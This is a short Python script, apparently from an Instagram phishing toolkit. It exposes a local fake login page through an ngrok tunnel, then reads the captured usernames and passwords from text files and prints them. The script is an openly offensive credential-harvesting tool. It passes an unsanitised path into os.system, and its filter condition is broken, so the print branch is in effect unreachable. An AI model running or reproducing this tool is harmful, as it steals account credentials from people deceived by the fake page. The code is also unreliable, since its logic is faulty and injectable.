import os

def main():
    path = input("[ENTER] enter the full path to ngrok: ")

    print("[INSTA] when done close both windows or they will run for ever")
    print("[INSTA] running...")
    command = "qterminal -e '"+path+"/./ngrok http 5000' | xterm -geometry 100-9+10 -e 'python3 tools/login/insta_log.py'"

    os.system(command)

    user = open("user.txt","r").readlines()
    pas = open("pass.txt","r").readlines()
    
    x = len(user)
    os.system("clear")

    for c in range(x):
        u = user[c]
        u = u.replace("\n","")
        p = pas[c]
        p = p.replace("\n","")
        
        if p or u == "NULL00":
            pass
        else:
            print("=====================")
            print("USER: ", u)
            print("PASS: ", p)
            print("NUM: ", c)
            print("=====================")
    input("[ENTER] hit enter to continue: ")